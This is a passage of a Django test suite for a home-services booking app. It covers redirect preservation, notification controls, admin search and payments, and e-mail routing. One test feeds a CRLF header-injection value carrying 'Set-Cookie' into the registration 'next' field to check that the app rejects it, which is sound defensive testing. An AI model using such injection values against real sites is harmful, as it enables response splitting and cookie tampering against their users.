        # the helper does not start second-guessing valid local paths.
        stored, location = self._full_flow('/no/such/path/', 'unresolved')
        self.assertEqual(stored, '/no/such/path/')
        self.assertEqual(location, '/no/such/path/')

    def test_crlf_next_is_rejected_when_supplied_via_post(self):
        """A GET query string is normalised by the WSGI layer (CR/LF removed),
        but a POST body is not. The helper must reject the raw value itself."""
        client = Client()
        target = '/valid/\r\nSet-Cookie: x=1'
        # GET: the newline never reaches the view, so what is stored is a
        # harmless same-origin path - still safe, and it stays on this host.
        client.get(reverse('register') + '?next=' + target)
        stored = client.session.get('registration_next')
        self.assertIsNotNone(stored)
        self.assertNotIn('\n', stored)
        self.assertNotIn('\r', stored)
        self.assertTrue(stored.startswith('/'))

        # POST: the raw CRLF reaches the view and must be discarded.
        client2 = Client()
        client2.post(
            reverse('register'),
            {
                'username': 'crlfpost', 'email': 'crlfpost@t.com',
                'password': 'Password123!', 'confirm_password': 'Password123!',
                'role': 'USER', 'next': target,
            },
        )
        self.assertIsNone(
            client2.session.get('registration_next'),
            'CRLF next was stored via POST: %r' % client2.session.get('registration_next'),
        )

    def test_worker_registering_is_sent_to_the_preserved_target(self):
        """A WORKER going through the same journey lands on the same target."""
        service = Service.objects.create(
            name='NextWorkerSvc', description='d', price=Decimal('500.00'), is_active=True
        )
        client = Client()
        target = '/services/5/'
        client.get(reverse('register') + '?next=' + target)

        proof = SimpleUploadedFile(
            'proof.pdf', b'%PDF-1.4 fake', content_type='application/pdf'
        )
        client.post(
            reverse('register'),
            {
                'username': 'wkrnext', 'email': 'wkrnext@t.com',
                'password': 'Password123!', 'confirm_password': 'Password123!',
                'role': 'WORKER',
                'phone': '9876543210',
                'service': str(service.id),
                'experience_years': '5',
                'district': 'Ernakulam',
                'availability': 'Full Time',
                'pricing_type': 'hour',
                'pricing_amount': '500',
                'address': 'Kakkanad, Kochi, Kerala',
                'proof_type': 'aadhaar',
                'proof_document': proof,
            },
        )
        self.assertTrue(
            CustomUser.objects.filter(username='wkrnext').exists(),
            'worker registration failed',
        )
        otp = CustomUser.objects.get(username='wkrnext').email_verification_otp
        client.post(reverse('verify_otp'), {'action': 'verify', 'otp': otp})

        # New workers are unverified, so login correctly bounces them back to
        # the login page with a verification message - the pending target must
        # survive that bounce untouched.
        bounced = client.post(
            reverse('login'), {'username': 'wkrnext', 'password': 'Password123!'}
        )
        self.assertEqual(bounced['Location'], reverse('login'))
        self.assertEqual(client.session.get('registration_next'), target)

        profile = WorkerProfile.objects.get(user__username='wkrnext')
        profile.is_verified = True
        profile.save(update_fields=['is_verified'])

        response = client.post(
            reverse('login'), {'username': 'wkrnext', 'password': 'Password123!'}
        )
        self.assertEqual(response['Location'], target)
        self.assertEqual(CustomUser.objects.get(username='wkrnext').role, 'WORKER')

    def test_register_page_renders_the_next_field_only_when_present(self):
        with_next = self.client.get(reverse('register') + '?next=/services/5/')
        self.assertContains(with_next, 'name="next"')
        self.assertContains(with_next, 'value="/services/5/"')

        without = self.client.get(reverse('register'))
        self.assertNotContains(without, 'name="next"')

class NotificationMarkAsReadUiTest(TestCase):
    """Worker and admin notification pages gained a mark-as-read control that
    reuses the existing POST endpoint, CSRF and ownership check."""

    def setUp(self):
        self.admin = _make_user('n_admin', role='ADMIN')
        self.service = Service.objects.create(
            name='NotifPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.worker = _make_worker('n_worker', self.service)
        self.customer = _make_user('n_customer')

    def test_worker_page_shows_a_control_only_for_unread(self):
        unread = Notification.objects.create(
            recipient=self.worker.user, notification_type='BOOKING', message='u'
        )
        read = Notification.objects.create(
            recipient=self.worker.user, notification_type='BOOKING', message='r',
            is_read=True,
        )
        self.client.login(
            username=self.worker.user.username, password='Password123!'
        )
        html = self.client.get(reverse('worker_notifications')).content.decode()

        self.assertIn('mark-read-btn', html)
        self.assertIn('data-notification-id="%d"' % unread.id, html)
        self.assertNotIn('data-notification-id="%d"' % read.id, html)

    def test_admin_page_shows_a_control_only_for_unread(self):
        unread = Notification.objects.create(
            recipient=self.admin, notification_type='BOOKING', message='u'
        )
        read = Notification.objects.create(
            recipient=self.admin, notification_type='BOOKING', message='r',
            is_read=True,
        )
        self.client.login(username=self.admin.username, password='Password123!')
        html = self.client.get(reverse('admin_notifications')).content.decode()

        self.assertIn('mark-read-btn', html)
        self.assertIn('data-notification-id="%d"' % unread.id, html)
        self.assertNotIn('data-notification-id="%d"' % read.id, html)

    def test_both_pages_load_the_shared_script(self):
        self.client.login(
            username=self.worker.user.username, password='Password123!'
        )
        self.assertIn(
            'js/notifications.js',
            self.client.get(reverse('worker_notifications')).content.decode(),
        )
        self.client.login(username=self.admin.username, password='Password123!')
        self.assertIn(
            'js/notifications.js',
            self.client.get(reverse('admin_notifications')).content.decode(),
        )

    def test_marking_one_users_notification_is_refused(self):
        other = Notification.objects.create(
            recipient=self.customer, notification_type='BOOKING', message='theirs'
        )
        self.client.login(
            username=self.worker.user.username, password='Password123!'
        )
        response = self.client.post(
            reverse('mark_notification_read', args=[other.id]),
            HTTP_X_REQUESTED_WITH='XMLHttpRequest',
        )
        self.assertEqual(response.status_code, 404)
        other.refresh_from_db()
        self.assertFalse(other.is_read)

    def test_marking_own_notification_succeeds(self):
        mine = Notification.objects.create(
            recipient=self.worker.user, notification_type='BOOKING', message='mine'
        )
        self.client.login(
            username=self.worker.user.username, password='Password123!'
        )
        response = self.client.post(
            reverse('mark_notification_read', args=[mine.id]),
            HTTP_X_REQUESTED_WITH='XMLHttpRequest',
        )
        self.assertEqual(response.status_code, 200)
        self.assertTrue(response.json()['success'])
        mine.refresh_from_db()
        self.assertTrue(mine.is_read)

    def test_get_does_not_mark_read(self):
        mine = Notification.objects.create(
            recipient=self.worker.user, notification_type='BOOKING', message='mine'
        )
        self.client.login(
            username=self.worker.user.username, password='Password123!'
        )
        self.client.get(reverse('mark_notification_read', args=[mine.id]))
        mine.refresh_from_db()
        self.assertFalse(mine.is_read)

    def test_shared_script_keeps_the_customer_handler(self):
        source = (
            Path(__file__).resolve().parent / 'static' / 'js' / 'notifications.js'
        ).read_text(encoding='utf-8')
        self.assertIn("'.mark-read-btn'", source)          # customer page
        self.assertIn('data-lamo-mark-read', source)        # worker/admin pages
        self.assertEqual(source.count('{'), source.count('}'))
        self.assertEqual(source.count('('), source.count(')'))

class EmergencyEmptyStateTest(TestCase):
    """The emergency card explains WHY it is empty, but only when the backend
    can state the reason with certainty."""

    def setUp(self):
        self.service = Service.objects.create(
            name='EmptyPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.worker = _make_worker('empty_worker', self.service)
        self.client.login(
            username=self.worker.user.username, password='Password123!'
        )

    def _html(self):
        return self.client.get(reverse('worker_dashboard')).content.decode()

    def test_dashboard_loads_its_page_stylesheet(self):
        response = self.client.get(reverse('worker_dashboard'))

        self.assertContains(
            response,
            'href="/static/css/dashboards-worker_dashboard.css?v=20261011"',
        )
        stylesheet = (
            Path(settings.BASE_DIR)
            / 'lamoapp' / 'static' / 'css' / 'dashboards-worker_dashboard.css'
        )
        self.assertTrue(stylesheet.is_file())
        css = stylesheet.read_text(encoding='utf-8')
        for selector in (
            '.dashboard-hero',
            '.dashboard-grid',
            '.card-heading',
            '.worker-stats',
            '.stat-card',
            '.job-row',
            '.message-list',
            '.quick-action',
            '.verification-box',
            '.earn-box',
            '.review-item',
            '.status-description',
            '.dashboard-container',
            '.worker-emergency-card',
            '.profile-summary',
            '.dashboard-left-column',
            '.dashboard-right-column',
            '.timeline-item',
            '.quick-actions',
        ):
            with self.subTest(selector=selector):
                self.assertIn(selector, css)
        self.assertIn('@media(max-width:700px)', css)
        self.assertContains(response, reverse('worker_update_status'))
        self.assertContains(response, reverse('worker_jobs'))
        self.assertNotContains(response, 'Nothing open right now')
        self.assertContains(response, 'Recent Customer Messages')
        html = response.content.decode()
        self.assertLess(html.index('Recent Customer Messages'), html.index('RIGHT COLUMN'))

    def test_customer_messages_keep_booking_reply_action(self):
        customer = CustomUser.objects.create_user(
            username='message_customer',
            email='message-customer@test.com',
            password='Password123!',
            role='CUSTOMER',
        )
        booking = Booking.objects.create(
            customer=customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(),
            time='10:00',
            location='Kollam',
            phone='9876543210',
            status='ACCEPTED',
            description='Dashboard chat regression booking',
        )

        response = self.client.get(reverse('worker_dashboard'))

        self.assertContains(response, 'Recent Customer Messages')
        self.assertContains(response, customer.username)
        self.assertContains(response, reverse('booking_messages', args=[booking.id]))

    def test_dashboard_shows_real_recent_customer_reviews(self):
        customer = CustomUser.objects.create_user(
            username='review_customer',
            email='review-customer@test.com',
            password='Password123!',
            role='CUSTOMER',
        )
        booking = Booking.objects.create(
            customer=customer,
            worker=self.worker,
            service=self.service,
            date=_future_date_str(),
            time='10:00',
            location='Kollam',
            phone='9876543210',
            status='COMPLETED',
            description='Dashboard review regression booking',
        )
        Review.objects.create(
            booking=booking,
            customer=customer,
            worker=self.worker,
            rating=5,
            comment='Excellent and professional service.',
        )

        response = self.client.get(reverse('worker_dashboard'))

        self.assertContains(response, 'Customer Reviews')
        self.assertContains(response, 'Excellent and professional service.')
        self.assertContains(response, '5/5')

    def test_empty_state_is_rendered_when_nothing_is_open(self):
        self.assertIn('No emergency requests', self._html())

    def test_generic_message_for_an_eligible_worker(self):
        self.assertIn('no emergency requests for your trade', self._html().lower())

    def test_reason_mentions_verification_for_an_unverified_worker(self):
        self.worker.is_verified = False
        self.worker.save()
        self.assertIn('verified', self._html().lower())

    def test_reason_mentions_leave_for_a_worker_on_leave(self):
        self.worker.work_status = 'LEAVE'
        self.worker.save()
        self.assertIn('leave', self._html().lower())

    def test_reason_mentions_duty_for_a_worker_on_duty(self):
        self.worker.work_status = 'ON_DUTY'
        self.worker.save()
        self.assertIn('duty', self._html().lower())

    def test_reason_for_a_worker_with_no_trade(self):
        self.worker.service = None
        self.worker.save()
        self.assertIn('service or trade', self._html().lower())

    def test_reason_helper_returns_none_for_an_eligible_worker(self):
        from lamoapp.views import _emergency_unavailable_reason

        self.assertIsNone(
            _emergency_unavailable_reason(self.worker, self.worker.user)
        )

    def test_reason_helper_never_reveals_internal_filtering(self):
        from lamoapp.views import _emergency_unavailable_reason

        self.worker.is_verified = False
        self.worker.save()
        reason = _emergency_unavailable_reason(self.worker, self.worker.user)
        for leak in ('emergency_pending', 'booking', 'filter', 'queryset'):
            self.assertNotIn(leak, reason.lower())

    def test_jobs_page_also_surfaces_emergencies(self):
        booking = Booking.objects.create(
            customer=_make_user('empty_cust'), worker=None, service=self.service,
            booking_type='Emergency', date=None, time='ASAP', location='Kochi',
            phone='9876543210', district='Ernakulam', status='EMERGENCY_PENDING',
        )
        html = self.client.get(reverse('worker_jobs')).content.decode()
        self.assertIn(
            reverse('worker_accept_emergency', args=[booking.id]), html
        )
        # It must reuse the same endpoint, not a second accept path.
        self.assertIn(reverse('worker_reject_booking', args=[booking.id]), html)

class AdminSearchTest(TestCase):
    """Server-side ?q= search on the users and workers admin lists."""

    def setUp(self):
        self.admin = _make_user('s_admin', role='ADMIN')
        self.service = Service.objects.create(
            name='SearchPlumbing', description='d', price=Decimal('500.00'),
            is_active=True,
        )
        self.plumber = _make_user('s_plumber', role='USER')
        self.plumber.first_name = 'Ada'
        self.plumber.last_name = 'Lovelace'
        self.plumber.save()
        self.electrician = _make_user('s_electrician', role='USER')
        _make_worker('s_worker', self.service, district='Kollam')
        self.client.login(username=self.admin.username, password='Password123!')

    def _usernames(self, response):
        return [u.username for u in response.context['users']]

    def _worker_names(self, response):
        return [w.user.username for w in response.context['workers']]

    def test_user_search_matches_username(self):
        response = self.client.get(reverse('users_list'), {'q': 'plumber'})
        self.assertEqual(self._usernames(response), ['s_plumber'])

    def test_user_search_matches_email(self):
        response = self.client.get(reverse('users_list'), {'q': 's_electrician@'})
        self.assertEqual(self._usernames(response), ['s_electrician'])

    def test_user_search_matches_first_name(self):
        response = self.client.get(reverse('users_list'), {'q': 'Ada'})
        self.assertIn('s_plumber', self._usernames(response))

    def test_user_search_with_no_match_returns_empty(self):
        response = self.client.get(reverse('users_list'), {'q': 'zzzznope'})
        self.assertEqual(self._usernames(response), [])
        self.assertEqual(response.context['search'], 'zzzznope')

    def test_user_search_value_is_rendered_for_resubmission(self):
        response = self.client.get(reverse('users_list'), {'q': 'plumber'})
        self.assertIn('value="plumber"', response.content.decode())

    def test_user_search_never_leaks_other_roles(self):
        response = self.client.get(reverse('users_list'), {'q': 'admin'})
        self.assertNotIn('s_admin', self._usernames(response))

    def test_worker_search_matches_trade(self):
        response = self.client.get(reverse('workers_list'), {'q': 'Plumbing'})
        self.assertEqual(self._worker_names(response), ['s_worker'])

    def test_worker_search_matches_username(self):
        response = self.client.get(reverse('workers_list'), {'q': 's_worker'})
        self.assertEqual(self._worker_names(response), ['s_worker'])

    def test_worker_search_matches_district(self):
        response = self.client.get(reverse('workers_list'), {'q': 'Kollam'})
        self.assertIn('s_worker', self._worker_names(response))

    def test_worker_search_with_no_match_returns_empty(self):
        response = self.client.get(reverse('workers_list'), {'q': 'zzzznope'})
        self.assertEqual(self._worker_names(response), [])

    def test_blank_search_shows_everything(self):
        response = self.client.get(reverse('users_list'), {'q': '   '})
        self.assertEqual(len(self._usernames(response)), 2)
        self.assertEqual(response.context['search'], '')

    def test_search_is_applied_before_pagination(self):
        CustomUser.objects.filter(role='USER').delete()
        for i in range(25):
            _make_user('page_user_%02d' % i, role='USER')
        response = self.client.get(reverse('users_list'), {'q': 'page_user'})
        self.assertEqual(response.context['users'].paginator.count, 25)
        self.assertEqual(len(response.context['users'].object_list), 20)
        response = self.client.get(
            reverse('users_list'), {'q': 'page_user', 'page': 2}
        )
        self.assertEqual(len(response.context['users'].object_list), 5)

    def test_search_is_not_available_to_non_admins(self):
        self.client.login(username=self.plumber.username, password='Password123!')
        for name in ('users_list', 'workers_list'):
            with self.subTest(view=name):
                response = self.client.get(reverse(name), {'q': 'a'})
                self.assertEqual(response.status_code, 302)
                self.assertIn(reverse('dashboard'), response['Location'])


class BookingEmailResendRoutingTest(TestCase):
    """Booking/transactional e-mail must go through the Resend API when
    USE_RESEND=True, never through Django's (dummy) mail backend.

    Regression guard for the production defect where settings.py swaps
    EMAIL_BACKEND to ``django.core.mail.backends.dummy.EmailBackend`` as soon as
    USE_RESEND is on: the booking views used to call ``send_mail`` directly, so
    with Resend enabled every booking e-mail was silently discarded. They now
    call ``send_email_safely``, which posts to the Resend HTTPS API.
    """

    RESEND_SETTINGS = {
        'USE_RESEND': True,
        'RESEND_API_KEY': 're_test_dummy_key_not_a_secret',
        'RESEND_SENDER': 'LAMO <no-reply@lamo.test>',
    }

    def setUp(self):
        from django.core import mail
        mail.outbox = []
        self.addCleanup(setattr, mail, 'outbox', [])
        self.customer = _make_user('resend_customer')
        self.service = Service.objects.create(
            name='ResendPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.worker = _make_worker('resend_worker', self.service)

    def _booking(self, status='PENDING', **kwargs):
        defaults = dict(
            customer=self.customer,
            worker=self.worker,
            service=self.service,
            booking_type='One Time',
            date=_future_date_str(10),
            time='10:00 AM',
            location='Kochi',
            phone='9876543210',
            estimated_cost=Decimal('500.00'),
        )
        defaults.update(kwargs)
        return Booking.objects.create(status=status, **defaults)

    @override_settings(**RESEND_SETTINGS)
    def test_accept_booking_uses_resend_api_not_dummy_backend(self):
        """Accepting a booking must POST to the Resend API, not the dummy backend."""
        from unittest.mock import patch
        booking = self._booking(status='PENDING')
        self.client.login(username=self.worker.user.username, password='Password123!')

        with patch('lamoapp.email_utils.requests.post') as mock_post:
            mock_post.return_value.raise_for_status.return_value = None
            response = self.client.post(
                reverse('worker_accept_booking', args=[booking.id])
            )

        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertEqual(booking.status, 'ACCEPTED')
        # The whole point: the Resend HTTPS API was actually invoked.
        self.assertTrue(mock_post.called, 'booking-accepted e-mail did not use the Resend API')
        args, kwargs = mock_post.call_args
        self.assertEqual(args[0], 'https://api.resend.com/emails')
        payload = kwargs['json']
        self.assertEqual(payload['to'], [self.customer.email])
        self.assertEqual(payload['from'], 'LAMO <no-reply@lamo.test>')
        self.assertIn(f'Booking #{booking.id}', payload['subject'])
        # It must NOT have landed in Django's (dummy) mail backend.
        from django.core import mail
        self.assertEqual(len(mail.outbox), 0)

    @override_settings(**RESEND_SETTINGS)
    def test_reject_booking_uses_resend_api(self):
        from unittest.mock import patch
        booking = self._booking(status='PENDING')
        self.client.login(username=self.worker.user.username, password='Password123!')

        with patch('lamoapp.email_utils.requests.post') as mock_post:
            mock_post.return_value.raise_for_status.return_value = None
            self.client.post(reverse('worker_reject_booking', args=[booking.id]))

        booking.refresh_from_db()
        self.assertEqual(booking.status, 'REJECTED')
        self.assertTrue(mock_post.called, 'booking-rejected e-mail did not use the Resend API')
        self.assertEqual(mock_post.call_args.kwargs['json']['to'], [self.customer.email])

    @override_settings(**RESEND_SETTINGS)
    def test_cancel_booking_uses_resend_api(self):
        from unittest.mock import patch
        booking = self._booking(status='ACCEPTED')
        self.client.login(username=self.customer.username, password='Password123!')

        with patch('lamoapp.email_utils.requests.post') as mock_post:
            mock_post.return_value.raise_for_status.return_value = None
            self.client.post(reverse('cancel_booking', args=[booking.id]))

        booking.refresh_from_db()
        self.assertEqual(booking.status, 'CANCELLED')
        self.assertTrue(mock_post.called, 'booking-cancelled e-mail did not use the Resend API')
        self.assertEqual(
            mock_post.call_args.kwargs['json']['to'], [self.worker.user.email]
        )

    @override_settings(**RESEND_SETTINGS)
    def test_completion_request_uses_resend_api(self):
        from unittest.mock import patch
        booking = self._booking(status='IN_PROGRESS')
        self.client.login(username=self.worker.user.username, password='Password123!')

        with patch('lamoapp.email_utils.requests.post') as mock_post:
            mock_post.return_value.raise_for_status.return_value = None
            self.client.post(reverse('worker_request_completion', args=[booking.id]))

        booking.refresh_from_db()
        self.assertEqual(booking.status, 'COMPLETION_REQUESTED')
        self.assertTrue(mock_post.called, 'completion-request e-mail did not use the Resend API')
        self.assertEqual(
            mock_post.call_args.kwargs['json']['to'], [self.customer.email]
        )

    @override_settings(**RESEND_SETTINGS)
    def test_confirm_completion_uses_resend_api(self):
        from unittest.mock import patch
        booking = self._booking(status='COMPLETION_REQUESTED')
        self.client.login(username=self.customer.username, password='Password123!')

        with patch('lamoapp.email_utils.requests.post') as mock_post:
            mock_post.return_value.raise_for_status.return_value = None
            self.client.post(reverse('confirm_completion', args=[booking.id]))

        booking.refresh_from_db()
        self.assertEqual(booking.status, 'COMPLETED')
        self.assertTrue(mock_post.called, 'completion-confirmed e-mail did not use the Resend API')
        self.assertEqual(
            mock_post.call_args.kwargs['json']['to'], [self.worker.user.email]
        )

    @override_settings(**RESEND_SETTINGS)
    def test_resend_failure_is_logged_without_leaking_secrets(self):
        """A Resend outage must be logged (tagged), and the API key/token must
        never reach the log - send_email_safely scrubs the exception text."""
        from unittest.mock import patch
        booking = self._booking(status='PENDING')
        self.client.login(username=self.worker.user.username, password='Password123!')

        leaky = (
            'Resend rejected request: api_key=re_test_dummy_key_not_a_secret '
            'token=abcdef1234567890abcdef1234567890'
        )
        with patch('lamoapp.email_utils.requests.post', side_effect=Exception(leaky)):
            with self.assertLogs('lamoapp.email_utils', level='ERROR') as captured:
                response = self.client.post(
                    reverse('worker_accept_booking', args=[booking.id])
                )

        # The booking still transitions - a mail outage must not break the flow.
        self.assertEqual(response.status_code, 302)
        booking.refresh_from_db()
        self.assertEqual(booking.status, 'ACCEPTED')

        log_text = '\n'.join(captured.output)
        self.assertIn('email_send_failed', log_text)
        self.assertIn('purpose=booking_accepted', log_text)
        # Neither the key nor the token may appear verbatim.
        self.assertNotIn('re_test_dummy_key_not_a_secret', log_text)
        self.assertNotIn('abcdef1234567890abcdef1234567890', log_text)

    def test_no_view_calls_raw_send_mail_for_booking_email(self):
        """Source-level guard: the booking/transactional views must not call the
        raw ``send_mail`` (which the dummy backend would swallow under Resend)."""
        source = Path(settings.BASE_DIR, 'lamoapp', 'views.py').read_text(encoding='utf-8')
        self.assertNotIn(
            'from django.core.mail import send_mail',
            source,
            'views.py still imports send_mail - booking e-mail would bypass Resend',
        )
        self.assertNotIn(
            'send_mail(',
            source,
            'a raw send_mail( call remains in views.py - it is discarded under Resend',
        )

    @override_settings(**RESEND_SETTINGS)
    def test_resend_missing_config_is_logged_not_silent(self):
        """If USE_RESEND is on but the key/sender are blank, send_email_safely
        must log MissingConfig and return False instead of pretending success."""
        from lamoapp.email_utils import send_email_safely
        with self.settings(RESEND_API_KEY='', RESEND_SENDER=''):
            with self.assertLogs('lamoapp.email_utils', level='ERROR') as captured:
                sent = send_email_safely(
                    subject='x', message='y',
                    recipient_list=['a@b.test'], purpose='booking_accepted',
                )
        self.assertFalse(sent)
        log_text = '\n'.join(captured.output)
        self.assertIn('email_send_failed', log_text)
        self.assertIn('MissingConfig', log_text)


class AdminPaymentsPageTest(TestCase):
    """Admins can review and verify manually reported payments."""

    def setUp(self):
        self.admin = _make_user('p_admin', role='ADMIN')
        self.customer = _make_user('p_customer')
        self.service = Service.objects.create(
            name='PayPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.worker = _make_worker('p_worker', self.service)
        self.paid_booking = Booking.objects.create(
            customer=self.customer, worker=self.worker, service=self.service,
            date=date_type.today() + timedelta(days=2), time='10:00 AM',
            location='Kochi', phone='9876543210', estimated_cost=Decimal('500.00'),
            status='COMPLETED', is_paid=True, payment_method='UPI',
        )
        self.payment = Payment.objects.create(
            booking=self.paid_booking, amount=Decimal('500.00'),
            payment_method='UPI', payment_reference='LAMO-REF-1', status='PAID',
            gateway='manual', paid_at=timezone.now(),
        )
        self.unpaid_booking = Booking.objects.create(
            customer=self.customer, worker=self.worker, service=self.service,
            date=date_type.today() + timedelta(days=3), time='11:00 AM',
            location='Kochi', phone='9876543210', estimated_cost=Decimal('700.00'),
            status='ACCEPTED', is_paid=False,
        )
        self.client.login(username=self.admin.username, password='Password123!')

    def test_page_loads_for_admin(self):
        response = self.client.get(reverse('admin_payments'))
        self.assertEqual(response.status_code, 200)
        self.assertContains(response, 'Payments')

    def test_page_lists_recorded_payments(self):
        response = self.client.get(reverse('admin_payments'))
        self.assertEqual(len(response.context['payments'].object_list), 1)
        self.assertEqual(
            response.context['payments'].object_list[0].payment_reference,
            'LAMO-REF-1',
        )

    def test_pending_manual_payment_can_be_verified_by_admin(self):
        payment = Payment.objects.create(
            booking=self.unpaid_booking,
            amount=Decimal('700.00'),
            payment_method='UPI',
            payment_reference='ADMIN-VERIFY-1',
            status='PENDING',
            gateway='manual',
        )

        response = self.client.get(reverse('admin_payments'))
        self.assertContains(response, 'Mark paid (verified)')

        response = self.client.post(
            reverse('admin_confirm_payment', args=[payment.pk])
        )

        self.assertEqual(response.status_code, 302)
        payment.refresh_from_db()
        self.unpaid_booking.refresh_from_db()
        self.assertEqual(payment.status, 'PAID')
        self.assertIsNotNone(payment.paid_at)
        self.assertTrue(self.unpaid_booking.is_paid)

    def test_payment_confirmation_requires_admin_post(self):
        payment = Payment.objects.create(
            booking=self.unpaid_booking,
            amount=Decimal('700.00'),
            payment_method='UPI',
            payment_reference='ADMIN-VERIFY-2',
            status='PENDING',
            gateway='manual',
        )

        self.client.login(username=self.customer.username, password='Password123!')
        response = self.client.post(
            reverse('admin_confirm_payment', args=[payment.pk])
        )

        self.assertEqual(response.status_code, 302)
        payment.refresh_from_db()
        self.unpaid_booking.refresh_from_db()
        self.assertEqual(payment.status, 'PENDING')
        self.assertFalse(self.unpaid_booking.is_paid)

        self.client.login(username=self.admin.username, password='Password123!')
        response = self.client.get(
            reverse('admin_confirm_payment', args=[payment.pk])
        )
        self.assertEqual(response.status_code, 405)

    def test_cancelled_booking_report_cannot_be_verified(self):
        self.unpaid_booking.status = 'CANCELLED'
        self.unpaid_booking.save(update_fields=['status'])
        payment = Payment.objects.create(
            booking=self.unpaid_booking,
            amount=Decimal('700.00'),
            payment_method='UPI',
            payment_reference='ADMIN-VERIFY-CANCELLED',
            status='PENDING',
            gateway='manual',
        )

        response = self.client.post(
            reverse('admin_confirm_payment', args=[payment.pk])
        )

        self.assertEqual(response.status_code, 302)
        payment.refresh_from_db()
        self.unpaid_booking.refresh_from_db()
        self.assertEqual(payment.status, 'PENDING')
        self.assertFalse(self.unpaid_booking.is_paid)

    def test_total_paid_is_reported(self):
        response = self.client.get(reverse('admin_payments'))
        self.assertEqual(response.context['paid_total'], Decimal('500.00'))

    def test_status_filter_narrows_results(self):
        Payment.objects.filter(pk=self.payment.pk).update(status='REFUNDED')
        response = self.client.get(reverse('admin_payments'), {'status': 'PAID'})
        self.assertEqual(len(response.context['payments'].object_list), 0)
        response = self.client.get(reverse('admin_payments'), {'status': 'REFUNDED'})
        self.assertEqual(len(response.context['payments'].object_list), 1)

    def test_method_filter_narrows_results(self):
        response = self.client.get(reverse('admin_payments'), {'method': 'CASH'})
        self.assertEqual(len(response.context['payments'].object_list), 0)
        response = self.client.get(reverse('admin_payments'), {'method': 'UPI'})
        self.assertEqual(len(response.context['payments'].object_list), 1)

    def test_unknown_filter_values_are_ignored_not_errors(self):
        response = self.client.get(
            reverse('admin_payments'), {'status': 'NOPE', 'method': 'NOPE'}
        )
        self.assertEqual(response.status_code, 200)

    def test_unpaid_view_lists_bookings_without_a_payment(self):
        response = self.client.get(reverse('admin_payments'), {'view': 'unpaid'})
        self.assertTrue(response.context['is_unpaid_view'])
        unpaid = response.context['unpaid_bookings']
        self.assertEqual([b.id for b in unpaid], [self.unpaid_booking.id])

    def test_unpaid_view_excludes_paid_bookings(self):
        response = self.client.get(reverse('admin_payments'), {'view': 'unpaid'})
        self.assertNotIn(
            self.paid_booking.id, [b.id for b in response.context['unpaid_bookings']]
        )

    def test_unpaid_view_excludes_bookings_with_pending_reports(self):
        Payment.objects.create(
            booking=self.unpaid_booking,
            amount=Decimal('700.00'),
            payment_method='UPI',
            payment_reference='ADMIN-VERIFY-3',
            status='PENDING',
            gateway='manual',
        )

        response = self.client.get(reverse('admin_payments'), {'view': 'unpaid'})

        self.assertNotIn(
            self.unpaid_booking.id,
            [booking.id for booking in response.context['unpaid_bookings']],
        )

    def test_non_admin_is_redirected(self):
        self.client.login(username=self.customer.username, password='Password123!')
        response = self.client.get(reverse('admin_payments'))
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse('dashboard'), response['Location'])

    def test_anonymous_is_sent_to_login(self):
        self.client.logout()
        response = self.client.get(reverse('admin_payments'))
        self.assertEqual(response.status_code, 302)
        self.assertIn(reverse('login'), response['Location'])

    def test_payment_model_unchanged_by_this_feature(self):
        field_names = {f.name for f in Payment._meta.get_fields()}
        self.assertEqual(
            field_names - {'id', 'booking', 'amount', 'payment_method',
                           'payment_reference', 'status', 'gateway', 'paid_at',
                           'created_at', 'updated_at'},
            set(),
        )

class CustomerEmergencyStatusTextTest(TestCase):
    """Pending/accepted emergency bookings explain what is happening."""

    def setUp(self):
        self.customer = _make_user('es_customer')
        self.service = Service.objects.create(
            name='StatusPlumb', description='d', price=Decimal('500.00'), is_active=True
        )
        self.client.login(username=self.customer.username, password='Password123!')

    def _make(self, status):
        return Booking.objects.create(
            customer=self.customer, service=self.service, booking_type='Emergency',
            date=None, time='ASAP', location='Kochi', phone='9876543210',
            district='Ernakulam', status=status,
        )

    def test_pending_emergency_explains_expiry_and_next_steps(self):
        self._make('EMERGENCY_PENDING')
        html = self.client.get(reverse('my_bookings')).content.decode()
        self.assertIn('What happens now', html)
        self.assertIn('expires', html)

    def test_accepted_emergency_explains_what_happens_next(self):
        self._make('ACCEPTED')
        html = self.client.get(reverse('my_bookings')).content.decode()
        self.assertIn('What happens now', html)
        self.assertIn('accepted your emergency request', html)

    def test_standard_booking_gets_no_emergency_copy(self):
        self._make('PENDING')
        html = self.client.get(reverse('my_bookings')).content.decode()
        self.assertNotIn('What happens now', html)


class StandalonePageNavigationTest(SimpleTestCase):
    """The two standalone pages gained a minimal nav without being restructured."""

    ROOT = Path(__file__).resolve().parent.parent / 'templates'

    def _source(self, name):
        return (self.ROOT / name).read_text(encoding='utf-8')

    def test_service_workers_still_is_a_standalone_document(self):
        source = self._source('lamo_service/service_workers.html')
        self.assertNotIn('{% extends', source)
        self.assertIn('<!DOCTYPE html>', source)
        self.assertIn('workers-page-nav', source)

    def test_service_workers_keeps_its_booking_modal_and_map(self):
        source = self._source('lamo_service/service_workers.html')
        modal_source = self._source('lamo_service/includes/booking_modal.html')
        self.assertIn('lamo_service/includes/booking_modal.html', source)
        self.assertIn('id="bookingModalForm"', modal_source)
        self.assertIn('id="emergencyModal"', source)
        self.assertIn('leaflet', source.lower())

    def test_ai_book_opens_the_same_booking_modal_without_navigation(self):
        detail_source = self._source('lamo_service/service_detail.html')
        workers_source = self._source('lamo_service/service_workers.html')
        modal_source = self._source('lamo_service/includes/booking_modal.html')

        self.assertIn('data-worker-id="${escapeHtml(worker.worker_id)}"', detail_source)
        self.assertIn('data-service-id="{{ service.id }}"', detail_source)
        self.assertIn('onclick="openBookingModal(this)"', detail_source)
        self.assertNotIn('href="${manualLink}&book_worker=', detail_source)
        self.assertIn('lamo_service/includes/booking_modal.html', detail_source)
        self.assertIn('lamo_service/includes/booking_modal.html', workers_source)
        self.assertIn('function openBookingModal(button)', modal_source)
        self.assertIn('action="{% url \'book_service\' %}"', modal_source)
        self.assertIn('onclick="closeBookingModal()"', modal_source)
        self.assertIn('event.key === "Escape"', modal_source)
        self.assertIn('if (event.target === bookingModal)', modal_source)
        self.assertIn('onclick="openBookingModal(this)"', workers_source)

    def test_standalone_nav_posts_logout_with_csrf(self):
        for name in ('lamo_service/service_workers.html', 'user/raise_complaint.html'):
